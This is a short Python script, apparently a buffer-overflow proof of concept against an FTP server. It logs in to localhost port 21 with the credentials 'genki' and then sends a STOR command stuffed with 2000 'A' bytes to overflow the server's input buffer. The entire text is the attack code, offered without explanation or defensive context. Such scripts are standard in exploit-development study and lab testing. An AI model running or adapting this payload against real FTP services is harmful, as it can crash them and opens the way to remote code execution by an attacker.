import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer='\x41' *2000

print("\Sending buffeer")
s.connect(('localhost',21))
data=s.recv(1024)
s.send('USER genki'+'\r\n')
data=s.recv(1024)
s.send('PASS genki'+'\r\n')
data=s.recv(1024)
s.send('STOR' +buffer+ '\r\n')
s.close()

